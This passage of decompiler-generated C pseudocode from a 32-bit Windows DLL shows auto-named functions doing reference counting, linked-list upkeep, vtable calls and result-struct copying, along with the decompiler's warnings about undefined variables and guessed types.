  if ( v15 || *v27 || v26 < 0 )
    goto LABEL_33;
  if ( !v26 )
  {
    v28 = (LONG *)(*(int (__thiscall **)(int, int))(*(_DWORD *)v2 + 44))(v2, 4);
    if ( *(_WORD *)sub_1000D52B(v29, 0, v28) == 48 )
    {
      v14 = a1;
      goto LABEL_27;
    }
LABEL_33:
    v9 = 0;
LABEL_6:
    v39 = -1;
    sub_10007D7A((void **)&a2);
    return v9;
  }
LABEL_27:
  v30 = (*(int (__thiscall **)(int, int))(*(_DWORD *)v2 + 44))(v2, 5);
  sub_10001236((LONG *)(v30 + 4), (LONG *)v14 + 12);
  sub_10001236((LONG *)(dword_101842F4 + 28), (LONG *)v14 + 14);
  for ( i = 6; i < (*(int (__thiscall **)(int))(*(_DWORD *)v2 + 4))(v2); ++i )
  {
    v31 = (LONG *)(*(int (__thiscall **)(int, unsigned int))(*(_DWORD *)v2 + 44))(v2, i);
    if ( *(_WORD *)sub_1000D52B(v32, 0, v31) != 46 )
    {
      v33 = (LONG *)(*(int (__thiscall **)(int, unsigned int))(*(_DWORD *)v2 + 44))(v2, i);
      if ( *(_WORD *)sub_1000D52B(v34, 0, v33) != 42 )
        continue;
    }
    v35 = (void (__thiscall **)(int, int))(a1[6] + 36);
    v36 = (*(int (__thiscall **)(int, unsigned int))(*(_DWORD *)v2 + 44))(v2, i);
    (*v35)((int)(a1 + 6), v36);
  }
  v39 = -1;
  sub_10007D7A((void **)&a2);
  return 1;
}
// 10028C3D: variable 'v19' is possibly undefined
// 10028CA3: variable 'v24' is possibly undefined
// 10028D06: variable 'v29' is possibly undefined
// 10028D5B: variable 'v32' is possibly undefined
// 10028D72: variable 'v34' is possibly undefined
// 101842F4: using guessed type int dword_101842F4;

//----- (10028DD1) --------------------------------------------------------
int __usercall sub_10028DD1@<eax>(_DWORD *a1@<ebp>)
{
  _DWORD *v1; // eax
  void *v2; // eax
  int v3; // edx
  int v4; // eax
  volatile LONG *v5; // ecx
  volatile LONG *v6; // ecx
  void *v7; // ebx
  LONG *v8; // esi
  int v9; // ecx
  int v10; // eax
  int v11; // ecx
  int v12; // eax
  int v13; // ecx
  int v14; // eax
  int v15; // ecx
  _DWORD *v17; // eax
  wchar_t *v18; // ecx
  int v19; // edi
  struct _FILETIME v20; // rax
  void *v21; // eax
  int v22; // eax
  void *v23; // eax
  wchar_t *v24; // ecx
  int v25; // eax
  _DWORD *v26; // eax
  _DWORD *v27; // eax
  wchar_t *v28; // ecx
  wchar_t *v29; // ecx
  void *v30; // eax
  wchar_t *v31; // ecx
  _DWORD *v32; // ecx
  int v33; // eax
  wchar_t *v34; // ecx
  int v35; // eax
  int v36; // ecx
  int v37; // ecx
  volatile LONG *v38; // ecx
  __int32 v39; // eax
  bool v40; // al
  _DWORD *v41; // esi
  void *v42; // edi
  int v43; // ebx
  unsigned int v44; // [esp-44h] [ebp-F8h]
  volatile LONG *v45; // [esp-40h] [ebp-F4h] BYREF
  volatile LONG *v46; // [esp-3Ch] [ebp-F0h]
  int v47[4]; // [esp-38h] [ebp-ECh] BYREF
  __int64 v48; // [esp-28h] [ebp-DCh] BYREF
  int v49; // [esp-20h] [ebp-D4h] BYREF
  int v50; // [esp-1Ch] [ebp-D0h]
  _DWORD *v51; // [esp-18h] [ebp-CCh] BYREF
  int v52; // [esp-14h] [ebp-C8h]
  wchar_t *v53; // [esp-10h] [ebp-C4h] BYREF
  wchar_t *v54; // [esp-Ch] [ebp-C0h]
  volatile LONG *v55; // [esp-8h] [ebp-BCh] BYREF
  volatile LONG *v56; // [esp-4h] [ebp-B8h]

  a1[21] = 0;
  sub_1000B1F3(0, (int)(a1 - 25), 0);
  *(a1 - 1) = 0;
  v1 = sub_1000132C(a1 - 41);
  sub_10029BC2((__int32)v1);
  v2 = operator new(0x90u);
  a1[25] = v2;
  *((_BYTE *)a1 - 4) = 1;
  if ( v2 )
    v4 = sub_1002FE95(*(_DWORD *)(dword_101842F4 + 16), v3, (int)v2);
  else
    v4 = 0;
  *((_BYTE *)a1 - 4) = 0;
  sub_1000728E(a1 + 23, v4);
  *((_BYTE *)a1 - 4) = 2;
  v56 = v5;
  v55 = v5;
  a1[25] = &v55;
  v56 = (volatile LONG *)a1[24];
  v55 = (volatile LONG *)a1[23];
  InterlockedIncrement(v56);
  *((_BYTE *)a1 - 4) = 3;
  *((_BYTE *)a1 - 4) = 2;
  sub_10028A48((int)v55);
  sub_1000D17D(a1 + 17, &word_10178C60);
  *((_BYTE *)a1 - 4) = 4;
  v56 = v6;
  v55 = v6;
  a1[25] = &v55;
  sub_1000728E(&v55, 0);
  *((_BYTE *)a1 - 4) = 5;
  v54 = (wchar_t *)(a1 + 17);
  LOBYTE(v53) = 0;
  *((_BYTE *)a1 - 4) = 4;
  sub_1004F292((_DWORD *)dword_10182DE8, (char)v53, (int)v54, (int)v55, (int)v56);
  *((_BYTE *)a1 - 4) = 2;
  sub_1000D3AD(a1 + 17);
  *((_BYTE *)a1 - 4) = 6;
  sub_10006814(a1 - 16);
  *((_BYTE *)a1 - 4) = 7;
  v7 = (void *)(a1[29] + 24);
  if ( (*(int (__thiscall **)(void *))(*(_DWORD *)v7 + 4))(v7) )
  {
    v8 = (LONG *)(*(int (__thiscall **)(void *, _DWORD))(*(_DWORD *)v7 + 44))(v7, 0);
    if ( *(_WORD *)sub_1000D52B(v9, 0, v8) != 42 )
    {
      sub_100185CD(v7, (int)(a1 + 19));
      *((_BYTE *)a1 - 4) = 8;
      while ( !(*(unsigned __int8 (__thiscall **)(_DWORD))(*(_DWORD *)a1[19] + 4))(a1[19]) )
      {
        v10 = (*(int (__thiscall **)(_DWORD))(*(_DWORD *)a1[19] + 12))(a1[19]);
        sub_10007469(a1 - 16, v10);
        sub_10021F56(v11, a1[19]);
      }
      *((_BYTE *)a1 - 4) = 7;
      sub_10007D7A((void **)a1 + 19);
    }
  }
  sub_10006814(a1 - 12);
  *((_BYTE *)a1 - 4) = 9;
  sub_100185CD((void *)(dword_101842F4 + 76), (int)a1);
  *((_BYTE *)a1 - 4) = 10;
  while ( !(*(unsigned __int8 (__thiscall **)(_DWORD))(*(_DWORD *)*a1 + 4))(*a1) )
  {
    v12 = (*(int (__thiscall **)(_DWORD))(*(_DWORD *)*a1 + 12))(*a1);
    sub_10007469(a1 - 12, v12);
    sub_10021F56(v13, *a1);
  }
  *((_BYTE *)a1 - 4) = 9;
  sub_10007D7A((void **)a1);
  sub_10006814(a1 - 20);
  *((_BYTE *)a1 - 4) = 11;
  sub_100185CD((void *)(dword_101842F4 + 92), (int)(a1 + 2));
  *((_BYTE *)a1 - 4) = 12;
  while ( !(*(unsigned __int8 (__thiscall **)(_DWORD))(*(_DWORD *)a1[2] + 4))(a1[2]) )
  {
    v14 = (*(int (__thiscall **)(_DWORD))(*(_DWORD *)a1[2] + 12))(a1[2]);
    sub_10007469(a1 - 20, v14);
    sub_10021F56(v15, a1[2]);
  }
  *((_BYTE *)a1 - 4) = 11;
  sub_10007D7A((void **)a1 + 2);
  sub_100077CD(a1 + 13);
  *((_BYTE *)a1 - 4) = 13;
  sub_1002A306((__int32)(a1 - 8), a1 - 8, *(void **)(dword_101842F4 + 56), (void *)(dword_101842F4 + 60));
  *((_BYTE *)a1 - 4) = 14;
  if ( *(a1 - 5) )
  {
    v17 = (_DWORD *)(*(int (__thiscall **)(_DWORD *, _DWORD))(*(a1 - 8) + 44))(a1 - 8, 0);
    sub_10011AE0(v17, a1 + 17);
    *((_BYTE *)a1 - 4) = 15;
    v54 = v18;
    v53 = v18;
    a1[25] = &v53;
    sub_10011AE0(a1 + 17, &v53);
    *((_BYTE *)a1 - 4) = 16;
    v52 = 1;
    v51 = a1 - 12;
    v50 = (int)hEvent;
    v49 = (int)(a1 + 4);
    *((_BYTE *)a1 - 4) = 15;
    sub_1002A5E0((__int32)(a1 + 4), (void **)a1 + 13, (_DWORD *)v49, (void *)v50, v51, (_DWORD *)v52, v53, v54);
    *((_BYTE *)a1 - 4) = 17;
    v19 = a1[29];
    v20 = sub_1002A02D(*(_DWORD *)(v19 + 40));
    *(struct _FILETIME *)(a1 + 15) = v20;
    *(struct _FILETIME *)(a1 + 11) = v20;
    v21 = operator new(0x3Cu);
    a1[25] = v21;
    *((_BYTE *)a1 - 4) = 18;
    if ( v21 )
      v22 = sub_1002EBDD(a1 - 16, (int)v21, a1 + 11, a1 - 20, 1);
    else
      v22 = 0;
    *((_BYTE *)a1 - 4) = 17;
    sub_1000728E(a1 + 11, v22);
    *((_BYTE *)a1 - 4) = 19;
    v23 = operator new(0x20u);
    v24 = v54;
    a1[25] = v23;
    *((_BYTE *)a1 - 4) = 20;
    if ( v23 )
    {
      v54 = v24;
      v53 = v24;
      a1[22] = &v53;
      v54 = (wchar_t *)a1[14];
      v53 = (wchar_t *)a1[13];
      InterlockedIncrement((volatile LONG *)v54);
      *((_BYTE *)a1 - 4) = 21;
      v52 = a1[25];
      *((_BYTE *)a1 - 4) = 20;
      v25 = sub_100287DB(v52, (int)v53, (volatile LONG *)v54);
    }
    else
    {
      v25 = 0;
    }
    *((_BYTE *)a1 - 4) = 19;
    sub_10039112(a1 + 19, v25);
    *((_BYTE *)a1 - 4) = 22;
    v26 = operator new(0x1Cu);
    a1[22] = v26;
    *((_BYTE *)a1 - 4) = 23;
    if ( v26 )
      v27 = sub_100289DB(v26);
    else
      v27 = 0;
    *((_BYTE *)a1 - 4) = 22;
    sub_10039112(a1 + 9, (int)v27);
    *((_BYTE *)a1 - 4) = 24;
    v54 = v28;
    v53 = v28;
    a1[22] = &v53;
    sub_1000A205(a1 + 11, &v53);
    *((_BYTE *)a1 - 4) = 25;
    *((_BYTE *)a1 - 4) = 24;
    sub_10028920((_DWORD *)a1[9], (char)v53, (int)v54);
    sub_1000728E(a1 + 7, 0);
    *((_BYTE *)a1 - 4) = 26;
    v54 = v29;
    v53 = v29;
    a1[22] = &v53;
    sub_1002D137(a1 + 19, &v53);
    *((_BYTE *)a1 - 4) = 27;
    *((_BYTE *)a1 - 4) = 26;
    sub_10028920((_DWORD *)a1[9], (char)v53, (int)v54);
    *((_BYTE *)a1 - 4) = 24;
    sub_1000780D(a1 + 7);
    v30 = operator new(0x2Cu);
    a1[25] = v30;
    *((_BYTE *)a1 - 4) = 28;
    if ( v30 )
    {
      sub_1000728E(a1 - 27, 0);
      *((_BYTE *)a1 - 4) = 29;
      a1[21] |= 1u;
      v54 = v31;
      v53 = v31;
      a1[22] = &v53;
      sub_1002D137(a1 + 9, &v53);
      *(a1 - 1) = 30;
      v52 = (int)v32;
      v51 = v32;
      a1[6] = &v51;
      sub_1000A205(a1 + 23, &v51);
      *((_BYTE *)a1 - 4) = 31;
      v50 = 20;
      v49 = 31;
      HIDWORD(v48) = a1[25];
      *((_BYTE *)a1 - 4) = 29;
      v33 = sub_1003051D(
              SHIDWORD(v48),
              v49,
              (wchar_t *)v50,
              (int)v51,
              (volatile LONG *)v52,
              (int)v53,
              (volatile LONG *)v54);
    }
    else
    {
      v33 = 0;
    }
    *(a1 - 1) = 32;
    sub_1000728E(a1 + 7, v33);
    *(a1 - 1) = 34;
    if ( (a1[21] & 1) != 0 )
    {
      a1[21] &= ~1u;
      sub_1000780D(a1 - 27);
    }
    v54 = v34;
    v53 = v34;
    a1[6] = &v53;
    sub_1000A205(a1 + 7, &v53);
    *((_BYTE *)a1 - 4) = 35;
    v52 = a1[4];
    *((_BYTE *)a1 - 4) = 34;
    sub_10030A49(v52, (int)v53, (int)v54);
    v35 = sub_1000B261(dword_101842F4 + 8, (int)(a1 - 32), 0);
    *((_BYTE *)a1 - 4) = 36;
    (*(void (__thiscall **)(_DWORD, int, int))(*(_DWORD *)a1[23] + 4))(a1[23], v35, 222);
    *((_BYTE *)a1 - 4) = 34;
    sub_1000B3DF(a1 - 32);
    v52 = a1[16];
    v51 = (_DWORD *)a1[15];
    v50 = v36;
    v49 = v36;
    a1[6] = &v49;
    sub_1000A205(a1 + 23, &v49);
    *((_BYTE *)a1 - 4) = 37;
    HIDWORD(v48) = v37;
    LODWORD(v48) = v37;
    a1[22] = &v48;
    v48 = *(_QWORD *)(a1 + 19);
    InterlockedIncrement((volatile LONG *)HIDWORD(v48));
    *((_BYTE *)a1 - 4) = 38;
    a1[25] = v47;
    sub_100298D1(a1 - 8, v47);
    *((_BYTE *)a1 - 4) = 39;
    v46 = v38;
    v45 = v38;
    a1[16] = &v45;
    v46 = (volatile LONG *)a1[5];
    v45 = (volatile LONG *)a1[4];
    InterlockedIncrement(v46);
    *((_BYTE *)a1 - 4) = 40;
    v44 = *(_DWORD *)(dword_101842F4 + 20);
    *((_BYTE *)a1 - 4) = 34;
    sub_1002A7CB(
      a1 - 34,
      v19 + 44,
      v44,
      v45,
      v46,
      v47[0],
      v47[1],
      v47[2],
      v47[3],
      v48,
      v49,
      (volatile LONG *)v50,
      (int)v51,
      v52);
    a1[16] = &v51;
    sub_1000A205(a1 + 23, &v51);
    *((_BYTE *)a1 - 4) = 41;
    v39 = dword_101842F4 + 40;
    v50 = dword_101842F4 + 40;
    *((_BYTE *)a1 - 4) = 34;
    v40 = sub_10029EAA(v39, v50, (int)v51);
    v52 = 7;
    v41 = a1 - 34;
    v42 = (void *)a1[28];
    if ( !v40 )
    {
      v43 = v52;
      *(a1 - 34) = v52;
      qmemcpy(v42, v41, 4 * v43);
      *((_BYTE *)a1 - 4) = 24;
      sub_1000780D(a1 + 7);
      *((_BYTE *)a1 - 4) = 22;
      sub_1003406C((void **)a1 + 9);
      *((_BYTE *)a1 - 4) = 19;
      sub_1003406C((void **)a1 + 19);
      *((_BYTE *)a1 - 4) = 17;
      sub_1000780D(a1 + 11);
      *((_BYTE *)a1 - 4) = 15;
      sub_1003406C((void **)a1 + 4);
      *((_BYTE *)a1 - 4) = 14;
      sub_1000780D(a1 + 17);
      *((_BYTE *)a1 - 4) = 13;
      sub_1002987A(a1 - 8);
      *((_BYTE *)a1 - 4) = 11;
      sub_1000780D(a1 + 13);
      *((_BYTE *)a1 - 4) = 9;
      sub_100068A5(a1 - 20);
      *((_BYTE *)a1 - 4) = v43;
      goto LABEL_19;
    }
    qmemcpy(v42, v41, 4 * v52);
    *((_BYTE *)a1 - 4) = 24;
    sub_1000780D(a1 + 7);
    *((_BYTE *)a1 - 4) = 22;
    sub_1003406C((void **)a1 + 9);
    *((_BYTE *)a1 - 4) = 19;
    sub_1003406C((void **)a1 + 19);
    *((_BYTE *)a1 - 4) = 17;
    sub_1000780D(a1 + 11);
    *((_BYTE *)a1 - 4) = 15;
    sub_1003406C((void **)a1 + 4);
    *((_BYTE *)a1 - 4) = 14;
    sub_1000780D(a1 + 17);
  }
  else
  {
    *(a1 - 41) = 15;
    qmemcpy((void *)a1[28], a1 - 41, 0x1Cu);
  }
  *((_BYTE *)a1 - 4) = 13;
  sub_1002987A(a1 - 8);
  *((_BYTE *)a1 - 4) = 11;
  sub_1000780D(a1 + 13);
  *((_BYTE *)a1 - 4) = 9;
  sub_100068A5(a1 - 20);
  *((_BYTE *)a1 - 4) = 7;
LABEL_19:
  sub_100068A5(a1 - 12);
  *((_BYTE *)a1 - 4) = 6;
  sub_100068A5(a1 - 16);
  *((_BYTE *)a1 - 4) = 0;
  sub_1000780D(a1 + 23);
  *(a1 - 1) = -1;
  sub_1000B3DF(a1 - 25);
  return a1[28];
}
// 10028E29: variable 'v3' is possibly undefined
// 10028E43: variable 'v5' is possibly undefined
// 10028E7D: variable 'v6' is possibly undefined
// 10028EDC: variable 'v9' is possibly undefined
// 10028F16: variable 'v11' is possibly undefined
// 10028F6C: variable 'v13' is possibly undefined
// 10028FC2: variable 'v15' is possibly undefined
// 100290A0: variable 'v18' is possibly undefined
// 100291A9: variable 'v28' is possibly undefined
// 100291D5: variable 'v29' is possibly undefined
// 10029224: variable 'v31' is possibly undefined
// 1002923B: variable 'v32' is possibly undefined
// 1002928B: variable 'v34' is possibly undefined
// 100292E2: variable 'v36' is possibly undefined
// 100292F5: variable 'v37' is possibly undefined
// 1002932B: variable 'v38' is possibly undefined
// 10182DE8: using guessed type int dword_10182DE8;
// 101842F4: using guessed type int dword_101842F4;

//----- (1002950F) --------------------------------------------------------
int *__usercall sub_1002950F@<eax>(int *a1@<ebx>, int a2, int a3, volatile LONG *lpAddend)
{
  _DWORD *v4; // ebp
  int v6; // [esp-8h] [ebp-80h] BYREF
  unsigned int *v7; // [esp-4h] [ebp-7Ch]
  unsigned int v8[11]; // [esp+10h] [ebp-68h] BYREF
  char v9[4]; // [esp+3Ch] [ebp-3Ch] BYREF
  LONG v10[3]; // [esp+40h] [ebp-38h] BYREF
  int v11[10]; // [esp+4Ch] [ebp-2Ch] BYREF
  int v12; // [esp+74h] [ebp-4h]

  v12 = 0;
  sub_1000132C(v11);
  v11[0] = sub_10029E46();
  if ( !v11[0] )
  {
    sub_10028A76(v8);
    LOBYTE(v12) = 1;
    v11[7] = (int)&v6;
    v7 = (unsigned int *)lpAddend;
    v6 = a3;
    InterlockedIncrement(lpAddend);
    LOBYTE(v12) = 1;
    if ( sub_10028AD3(v8, v6) )
    {
      sub_10001236(v10, (LONG *)(a2 + 4));
      if ( sub_10029F42((int)v9, &unk_100FF898, (void *)4) )
      {
        if ( sub_1004DD38(*(void **)(dword_101842F4 + 4), (void *)(dword_101842F4 + 108)) )
        {
          v7 = v8;
          v6 = (int)a1;
          sub_10028DD1(v4);
          goto LABEL_11;
        }
        v11[0] = 8;
      }
      else
      {
        v11[0] = 7;
      }
    }
    else
    {
      v11[0] = 6;
    }
    qmemcpy(a1, v11, 0x1Cu);
LABEL_11:
    LOBYTE(v12) = 0;
    sub_1002960D(v8);
    goto LABEL_12;
  }
  qmemcpy(a1, v11, 0x1Cu);
LABEL_12:
  v12 = -1;
  sub_10007D7A((void **)&a3);
  return a1;
}
// 100295E5: variable 'v4' is possibly undefined
// 101842F4: using guessed type int dword_101842F4;
// 1002950F: using guessed type unsigned int var_68[11];
// 1002950F: using guessed type LONG var_38[3];
// 1002950F: using guessed type char var_3C[4];

//----- (1002960D) --------------------------------------------------------
void *__stdcall sub_1002960D(_DWORD *a1)
{
  sub_1000D3AD(a1 + 13);
  sub_1000D3AD(a1 + 11);
  sub_100068A5(a1 + 6);
  return sub_100068A5(a1 + 1);
}

//----- (10029657) --------------------------------------------------------
void __thiscall sub_10029657(_DWORD *this)
{
  _DWORD *i; // eax
  _DWORD *v3; // edi

  *this = &off_101031C0;
  for ( i = (_DWORD *)this[1]; i; i = v3 )
  {
    v3 = (_DWORD *)i[2];
    sub_10029968(i);
  }
  sub_10039F05(this);
}
// 101031C0: using guessed type int (__thiscall *off_101031C0)(void *Block, char);

//----- (100296AE) --------------------------------------------------------
_DWORD *__thiscall sub_100296AE(_DWORD *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  int v4; // ecx

  v3 = operator new(0x10u);
  if ( v3 )
  {
    v4 = this[1];
    v3[2] = 0;
    v3[1] = this;
    *v3 = &off_10103214;
    v3[3] = v4;
  }
  else
  {
    v3 = 0;
  }
  sub_10039112(a2, (int)v3);
  return a2;
}
// 10103214: using guessed type int (__thiscall *off_10103214)(void *Block, char);

//----- (1002970A) --------------------------------------------------------
_DWORD *__thiscall sub_1002970A(_DWORD *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  int v4; // ecx

  v3 = operator new(0x10u);
  if ( v3 )
  {
    v4 = this[2];
    v3[3] = 0;
    v3[1] = this;
    *v3 = &off_10103214;
    v3[2] = v4;
  }
  else
  {
    v3 = 0;
  }
  sub_10039112(a2, (int)v3);
  return a2;
}
// 10103214: using guessed type int (__thiscall *off_10103214)(void *Block, char);

//----- (10029766) --------------------------------------------------------
int *__thiscall sub_10029766(void *this, int *a2, unsigned int a3)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( a3 > v4 )
  {
    v5 = sub_1000E8EF(&a3);
    sub_100078FE((int)v5);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, a2);
  if ( a3 )
  {
    v6 = a3;
    do
    {
      sub_10042AAB(*a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}

//----- (100297CF) --------------------------------------------------------
void __thiscall sub_100297CF(void *this, int a2)
{
  void *v2[4]; // [esp+10h] [ebp-14h] BYREF
  int v3; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, void **, int))(*(_DWORD *)this + 28))(this, v2, a2);
  v3 = 0;
  (*(void (__thiscall **)(void *))(*(_DWORD *)v2[0] + 24))(v2[0]);
  v3 = -1;
  sub_1003406C(v2);
}

//----- (10029807) --------------------------------------------------------
int __thiscall sub_10029807(void *this, int a2)
{
  int v2; // esi
  void *v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, void **, int))(*(_DWORD *)this + 24))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(void *))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_1003406C(v4);
  return v2;
}

//----- (10029843) --------------------------------------------------------
int __thiscall sub_10029843(_DWORD *this)
{
  int (__thiscall ***v1)(_DWORD, int); // ecx
  int result; // eax

  *this = off_10103210;
  v1 = (int (__thiscall ***)(_DWORD, int))this[1];
  if ( v1 )
    return (**v1)(v1, 1);
  return result;
}
// 10103210: using guessed type int (__thiscall *off_10103210[2])(void *Block, char);

//----- (1002987A) --------------------------------------------------------
void __thiscall sub_1002987A(_DWORD *this)
{
  _DWORD *i; // eax
  _DWORD *v3; // edi

  *this = &off_10103158;
  for ( i = (_DWORD *)this[1]; i; i = v3 )
  {
    v3 = (_DWORD *)i[2];
    sub_10029968(i);
  }
  sub_10039F05(this);
}
// 10103158: using guessed type int (__thiscall *off_10103158)(void *Block, char);

//----- (100298D1) --------------------------------------------------------
_DWORD *__thiscall sub_100298D1(void *this, _DWORD *a2)
{
  *a2 = off_100FBF5C;
  *a2 = &off_10103158;
  a2[1] = 0;
  a2[2] = 0;
  a2[3] = 0;
  sub_10042B02((int)this, (int)a2);
  return a2;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10103158: using guessed type int (__thiscall *off_10103158)(void *Block, char);

//----- (10029911) --------------------------------------------------------
void __thiscall sub_10029911(void *this, int a2, int a3)
{
  void *v3[4]; // [esp+10h] [ebp-14h] BYREF
  int v4; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, void **, int))(*(_DWORD *)this + 28))(this, v3, a3);
  v4 = 0;
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)v3[0] + 28))(v3[0], a2);
  v4 = -1;
  sub_1003406C(v3);
}

//----- (1002994C) --------------------------------------------------------
_DWORD *__thiscall sub_1002994C(_DWORD *Block, char a2)
{
  sub_10029657(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10029968) --------------------------------------------------------
void *__stdcall sub_10029968(void *Block)
{
  sub_1000780D(Block);
  j__free(Block);
  return Block;
}

//----- (10029994) --------------------------------------------------------
_DWORD *__thiscall sub_10029994(_DWORD *Block, char a2)
{
  sub_10029843(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100299B0) --------------------------------------------------------
_DWORD *__thiscall sub_100299B0(_DWORD *Block, char a2)
{
  sub_1002987A(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100299CC) --------------------------------------------------------
int __thiscall sub_100299CC(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // eax
  int result; // eax
  _DWORD v4[4]; // [esp+10h] [ebp-10h] BYREF

  v1 = this[3];
  if ( !v1 )
  {
    v2 = sub_1000E8EF(v4);
    v4[3] = 0;
    sub_100078FE((int)v2);
  }
  this[2] = v1;
  result = *(_DWORD *)(v1 + 8);
  this[3] = result;
  return result;
}

//----- (10029A06) --------------------------------------------------------
int __thiscall sub_10029A06(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // eax
  int result; // eax
  _DWORD v4[4]; // [esp+10h] [ebp-10h] BYREF

  v1 = this[2];
  if ( !v1 )
  {
    v2 = sub_1000E8EF(v4);
    v4[3] = 0;
    sub_100078FE((int)v2);
  }
  this[3] = v1;
  result = *(_DWORD *)(v1 + 12);
  this[2] = result;
  return result;
}

//----- (10029A40) --------------------------------------------------------
void *__thiscall sub_10029A40(int this)
{
  int v2; // eax
  _DWORD *v3; // eax
  int v4; // edi
  int v5; // eax
  int v6; // eax
  int v7; // eax
  void *result; // eax
  _DWORD v9[4]; // [esp+10h] [ebp-10h] BYREF

  v2 = *(_DWORD *)(this + 12);
  if ( !v2 )
  {
    v3 = sub_1000E8EF(v9);
    v9[3] = 0;
    sub_100078FE((int)v3);
  }
  v4 = *(_DWORD *)(v2 + 8);
  v5 = *(_DWORD *)(this + 8);
  if ( v5 )
    *(_DWORD *)(v5 + 8) = v4;
  if ( v4 )
    *(_DWORD *)(v4 + 12) = *(_DWORD *)(this + 8);
  v6 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v6 + 4) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v6 + 4) = v4;
  v7 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v7 + 8) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v7 + 8) = *(_DWORD *)(this + 8);
  result = *(void **)(this + 12);
  if ( result )
    result = sub_10029968(*(void **)(this + 12));
  *(_DWORD *)(this + 12) = v4;
  --*(_DWORD *)(*(_DWORD *)(this + 4) + 12);
  return result;
}

//----- (10029ABF) --------------------------------------------------------
int *__thiscall sub_10029ABF(_DWORD *this, int *a2)
{
  void *v3; // eax
  volatile LONG *v4; // ecx
  int v5; // ecx
  int *result; // eax
  int v7; // ecx
  int v8; // ecx
  volatile LONG *v9; // [esp-10h] [ebp-34h] BYREF
  volatile LONG *v10; // [esp-Ch] [ebp-30h]
  int v11; // [esp-8h] [ebp-2Ch]
  volatile LONG *v12; // [esp-4h] [ebp-28h]
  void *v13; // [esp+10h] [ebp-14h]
  void *Block; // [esp+14h] [ebp-10h]
  int v15; // [esp+20h] [ebp-4h]

  ++*(_DWORD *)(this[1] + 12);
  v3 = operator new(0x10u);
  v4 = v12;
  Block = v3;
  v15 = 0;
  if ( v3 )
  {
    v12 = (volatile LONG *)this[2];
    v11 = this[3];
    v10 = v4;
    v9 = v4;
    v10 = (volatile LONG *)a2[1];
    v5 = *a2;
    v13 = &v9;
    v9 = (volatile LONG *)v5;
    InterlockedIncrement(v10);
    LOBYTE(v15) = 0;
    result = sub_10029B6B((int *)Block, (int)v9, v10, v11, (int)v12);
  }
  else
  {
    result = 0;
  }
  v15 = -1;
  v7 = this[2];
  if ( v7 )
    *(_DWORD *)(v7 + 8) = result;
  else
    *(_DWORD *)(this[1] + 4) = result;
  v8 = this[3];
  this[2] = result;
  if ( v8 )
    *(_DWORD *)(v8 + 12) = result;
  else
    *(_DWORD *)(this[1] + 8) = result;
  return result;
}

//----- (10029B6B) --------------------------------------------------------
int *__stdcall sub_10029B6B(int *a1, int a2, volatile LONG *lpAddend, int a4, int a5)
{
  int v5; // ecx
  volatile LONG *v7; // [esp-4h] [ebp-20h]

  v5 = a2;
  v7 = lpAddend;
  a1[1] = (int)lpAddend;
  *a1 = v5;
  InterlockedIncrement(v7);
  a1[2] = a4;
  a1[3] = a5;
  sub_1000780D(&a2);
  return a1;
}

//----- (10029BB6) --------------------------------------------------------
int __userpurge sub_10029BB6@<eax>(__int32 a1@<eax>, int a2)
{
  sub_10029BC2(a1);
  return a2;
}

//----- (10029BC2) --------------------------------------------------------
int __usercall sub_10029BC2@<eax>(__int32 a1@<eax>)
{
  int v1; // ecx
  int result; // eax
  _DWORD *v3; // eax
  int v4; // esi
  _DWORD *v5[2]; // [esp+10h] [ebp-18h] BYREF
  void *Block[3]; // [esp+18h] [ebp-10h] BYREF
  int v7; // [esp+24h] [ebp-4h]

  v1 = dword_10182DE8;
  result = _InterlockedExchange((volatile __int32 *)Block, a1);
  if ( !v1 )
  {
    sub_1000EDE4(dword_10193C90, v5);
    v7 = 0;
    if ( !dword_10182DE8 )
    {
      v3 = operator new(0x24u);
      v4 = (int)v3;
      Block[0] = v3;
      LOBYTE(v7) = 1;
      if ( v3 )
      {
        v3[1] = 0;
        *v3 = off_1010445C;
        v3 = (_DWORD *)sub_1001EEA4((int)(v3 + 2));
        LOBYTE(v7) = 1;
      }
      else
      {
        v4 = 0;
      }
      LOBYTE(v7) = 0;
      _InterlockedExchange((volatile __int32 *)Block, (__int32)v3);
      dword_10182DE8 = v4;
      dword_10183608 = v4;
    }
    v7 = -1;
    return sub_1000EDA4(v5);
  }
  return result;
}
// 1010445C: using guessed type int (__thiscall *off_1010445C[2])(void *Block, char);
// 10182DE8: using guessed type int dword_10182DE8;
// 10183608: using guessed type int dword_10183608;
// 10193C90: using guessed type int dword_10193C90[10];

//----- (10029C4A) --------------------------------------------------------
_DWORD *__stdcall sub_10029C4A(int a1, _DWORD *a2)
{
  sub_1000D372(a2, a1 + 12);
  return a2;
}

//----- (10029C7F) --------------------------------------------------------
_DWORD *__stdcall sub_10029C7F(int a1, _DWORD *a2)
{
  sub_1000D372(a2, a1 + 4);
  return a2;
}

//----- (10029CB4) --------------------------------------------------------
_DWORD *__stdcall sub_10029CB4(int a1, _DWORD *a2)
{
  sub_1000D372(a2, a1 + 20);
  return a2;
}

//----- (10029CE9) --------------------------------------------------------
int sub_10029CE9()
{
  int result; // eax

  result = *(_BYTE *)(dword_101842F4 + 367) != 0;
